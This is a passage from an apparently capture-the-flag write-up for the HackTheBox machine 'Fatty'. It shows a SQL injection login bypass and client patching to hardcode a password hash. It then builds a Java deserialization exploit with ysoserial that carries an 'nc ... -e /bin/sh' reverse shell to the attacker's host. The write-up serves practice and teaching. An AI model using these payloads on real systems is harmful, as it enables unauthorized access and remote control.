<code>clarabibi</code> as password should be ok.</p><p>My injection gave me login failed, so I tried something else:</p><div class="language-diff codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-diff codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 85)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 85)">cyfun&#x27; union select 1337,&#x27;qtc&#x27;,&#x27;qtc@fatty.htb&#x27;,&#x27;5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046&#x27;,&#x27;admin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 85)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(80, 250, 123)">+</span><span class="token inserted-sign inserted line" style="color:rgb(80, 250, 123)">cyfun&#x27; union select id,username,email,password,&#x27;admin&#x27; FROM users WHERE username=&#x27;qtc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>But still failing, let&#x27;s get back to <code>setPassword</code>:</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">public void setPassword(String password) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  String hashString = this.username + password + &quot;clarabibimakeseverythingsecure&quot;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>this.username</code> is used so since we&#x27;re not providing only <code>qtc</code> anymore but our
SQL payload, the calculated hash will be wrong.</p><p>So let&#x27;s patch it into:</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">public void setPassword(String password) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  String hashString = &quot;qtc&quot; + password + &quot;clarabibimakeseverythingsecure&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>But I couldn&#x27;t modify the <code>User.java</code> file this way because the dependency
<code>import javax.xml.bind.DatatypeConverter;</code> was removed from Java 11+ and
we are using Java 14 for <a href="https://github.com/Col-E/Recaf" target="_blank" rel="noopener noreferrer">recaf</a> so if this file is touched it can&#x27;t be recompiled
by <a href="https://github.com/Col-E/Recaf" target="_blank" rel="noopener noreferrer">recaf</a> unless you remove all references to <code>DatatypeConverter</code>.</p><p>So that&#x27;s what I did, I removed the imported and change the whole <code>setPassword</code>
function to the following and did the same in User class:</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">public void setPassword(String password) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    this.password = &quot;5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><img loading="lazy" src="https://i.imgur.com/FW7k0V8.png" class="img_ev3q"></p><p>Now we can login with:</p><ul><li>Username: <code>cyfun&#x27; union select id,username,email,password,&#x27;admin&#x27; FROM users WHERE username=&#x27;qtc</code></li><li>Password: whatever or void because we hardcoded the hash</li></ul><p>Now we have to look at a vuln in an admin-only feature. The only feature
accepting an input is <code>changePW</code>.</p><p>On the server: <code>htb/fatty/server/methods/Commands.java</code></p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">public static String changePW(ArrayList&lt;String&gt; args, User user) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  logger.logInfo(&quot;[+] Method &#x27;changePW&#x27; was called.&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  int methodID = 7;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  if (!user.getRole().isAllowed(methodID)) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    logger.logError(&quot;[+] Access denied. Method with id &#x27;&quot; + methodID + &quot;&#x27; was called by user &#x27;&quot; + user.getUsername() + &quot;&#x27; with role &#x27;&quot; + user.getRoleName() + &quot;&#x27;.&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    return &quot;Error: Method &#x27;changePW&#x27; is not allowed for this user account&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  String response = &quot;&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  String b64User = args.get(0);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  byte[] serializedUser = Base64.getDecoder().decode(b64User.getBytes());</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ByteArrayInputStream bIn = new ByteArrayInputStream(serializedUser);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ObjectInputStream oIn = new ObjectInputStream(bIn);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    User user1 = (User)oIn.readObject();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  } catch (Exception e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    e.printStackTrace();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    response = response + &quot;Error: Failure while recovering the User object.&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    return response;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  response = response + &quot;Info: Your call was successful, but the method is not fully implemented yet.&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  return response;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can see on the server that an object is create from the user input <code>(User)oIn.readObject();</code>.</p><p>There is an article an associated code repository explaining unserialize exploits
in Java commons-collections library:</p><ul><li><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#thevulnerability" target="_blank" rel="noopener noreferrer">Article</a></li><li><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="noopener noreferrer">Code</a></li></ul><p>It seems we have the vulnerable class InvokerTransformer and commons-collection:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ grep -r InvokerTransformer server_source</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*     */ public class InvokerTransformer</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*  56 */     return new InvokerTransformer(methodName);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*  77 */       return new InvokerTransformer(methodName);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*  81 */     return new InvokerTransformer(methodName, paramTypes, args);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*     */   private InvokerTransformer(String methodName) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*     */   public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/* 128 */       throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/* 130 */       throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/* 132 */       throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/* Location:              /home/cyfun/CTF/HackTheBox/machines/Fatty/fatty-server.jar!/org/apache/commons/collections/functors/InvokerTransformer.class</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/ClosureUtils.java:/*     */ import org.apache.commons.collections.functors.InvokerTransformer;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/ClosureUtils.java:/* 160 */     return asClosure(InvokerTransformer.getInstance(methodName));</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/ClosureUtils.java:/* 179 */     return asClosure(InvokerTransformer.getInstance(methodName, paramTypes, args));</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/PredicateUtils.java:/*     */ import org.apache.commons.collections.functors.InvokerTransformer;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/PredicateUtils.java:/* 218 */     return asPredicate(InvokerTransformer.getInstance(methodName));</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/PredicateUtils.java:/* 243 */     return asPredicate(InvokerTransformer.getInstance(methodName, paramTypes, args));</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/TransformerUtils.java:/*     */ import org.apache.commons.collections.functors.InvokerTransformer;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/TransformerUtils.java:/* 407 */     return InvokerTransformer.getInstance(methodName, null, null);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_source/org/apache/commons/collections/TransformerUtils.java:/* 425 */     return InvokerTransformer.getInstance(methodName, paramTypes, args);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>However we don&#x27;t know which version of the library is used.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="java-object-deserialization-exploit">Java object deserialization exploit<a href="#java-object-deserialization-exploit" class="hash-link" aria-label="Direct link to Java object deserialization exploit" title="Direct link to Java object deserialization exploit">​</a></h2><p>Let&#x27;s craft a reverse shell with <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener noreferrer">ysoserial</a>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ysoserial CommonsCollections5 &#x27;nc 10.10.14.89 8888 -e /bin/sh&#x27; &gt; revshell.ser</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>But if we try to send it with receive this error, telling us the code on the
client is not totally finished.</p><p><img loading="lazy" src="https://i.imgur.com/g7DsybZ.png" class="img_ev3q"></p><p>Let&#x27;s see where do this error comes from:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ grep -r &#x27;Not implemented yet&#x27; client_source</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">client_source/htb/fatty/client/gui/ClientGuiTest.java:/* 560 */             JOptionPane.showMessageDialog(passwordChange, &quot;Not implemented yet.&quot;, &quot;Error&quot;, 0);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The button is not mapped to <code>changePW</code> function.</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">changePassword.addActionListener(new ActionListener()</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      public void actionPerformed(ActionEvent e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        controlPanel.setVisible(false);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        passwordChange.setVisible(true);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    });</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pwChangeButton.addActionListener(new ActionListener()</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      public void actionPerformed(ActionEvent e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        JOptionPane.showMessageDialog(passwordChange, &quot;Not implemented yet.&quot;, &quot;Error&quot;, 0);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        passwordChange.setVisible(false);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        controlPanel.setVisible(true);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    });</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s see <code>changePW</code> on the client: <code>htb/fatty/client/methods/Invoker.java</code></p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">public String changePW(String username, String newPassword) throws MessageParseException, MessageBuildException, IOException {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  String methodName = (new Object() {  }).getClass().getEnclosingMethod().getName();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  logger.logInfo(&quot;[+] Method &#x27;&quot; + methodName + &quot;&#x27; was called by user &#x27;&quot; + this.user.getUsername() + &quot;&#x27;.&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  if (AccessCheck.checkAccess(methodName, this.user)) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    return &quot;Error: Method &#x27;&quot; + methodName + &quot;&#x27; is not allowed for this user account&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  User user = new User(username, newPassword);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ByteArrayOutputStream bOut = new ByteArrayOutputStream();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ObjectOutputStream oOut = new ObjectOutputStream(bOut);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    oOut.writeObject(user);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  } catch (IOException e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    e.printStackTrace();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    return &quot;Failure while serializing user object&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  byte[] serializedUser64 = Base64.getEncoder().encode(bOut.toByteArray());</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  this.action = new ActionMessage(this.sessionID, &quot;changePW&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  this.action.addArgument(new String(serializedUser64));</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  sendAndRecv();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  if (this.response.hasError()) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    return &quot;Error: Your action caused an error on the application server!&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  return this.response.getContentAsString();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So what we have to do is patch <code>pwChangeButton.addActionListener</code> and
replace</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">JOptionPane.showMessageDialog(passwordChange, &quot;Not implemented yet.&quot;, &quot;Error&quot;, 0);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>by</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">import java.nio.file.*;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    String data = new String(Files.readAllBytes(Paths.get(&quot;revshell.ser&quot;)));</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ClientGuiTest.this.invoker.changePW(&quot;qtc&quot;, data);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">} catch (Exception e42) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    JOptionPane.showMessageDialog(passwordChange, &quot;WTF happened&quot;, &quot;Error&quot;, 0);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    e42.printStackTrace();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Also <code>changePW</code> will call the User class overloaded constructor with 2 args
<code>public User(String username, String password)</code> that will call the full User
constructor <code>User(int uid, String username, String password, String email, Role role)</code>.</p><p>But in the full constructor the password is hashed so we need to change it from:</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*     */   public User(int uid, String username, String password, String email, Role role) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  20 */     this.uid = uid;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  21 */     this.username = username;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*     */</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  23 */     String hashString = this.username + password + &quot;clarabibimakeseverythingsecure&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  24 */     MessageDigest digest = null;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*     */     try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  26 */       digest = 